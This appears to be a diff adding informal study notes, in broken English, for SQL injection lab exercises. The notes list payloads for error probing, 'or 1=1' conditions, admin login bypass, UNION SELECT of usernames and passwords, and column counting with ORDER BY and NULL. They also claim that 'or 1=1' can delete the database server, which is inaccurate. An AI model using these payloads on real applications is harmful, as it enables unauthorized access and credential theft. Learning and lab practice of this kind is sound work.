@@ -1,0 +1,35 @@
+how can we cause error in web app is aur main focus
+either it cann be usinf " ' or specil charcters
+'--
+' or 1=1---             Don't forget to add + when using with web app
+                        take care with or 1=1 as it can delete the whole databse server
+lab 1 can be solved using the above tachnique don't forgrt to add +
+
+
+2. subverting application login 
+to bypass admin page
+eg.   ---> administator'--
+
+
+3.Retrieving data from other database tables
+++++++++++++++++++++++++++++++++++use of union sttacks+++++++++++++++++++++++++++++++++++++++++++++++
+' UNION SELECT username, password FROM users--      -----> for union attacks no of attributes must match and so the data types
+
+
+Determining the no. of columns
+use of order by clause to find the number of columns
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+etc.
+
+' UNION SELECT NULL FROM DUAL--  -------> for oracle SQL
+
+
+
+
+
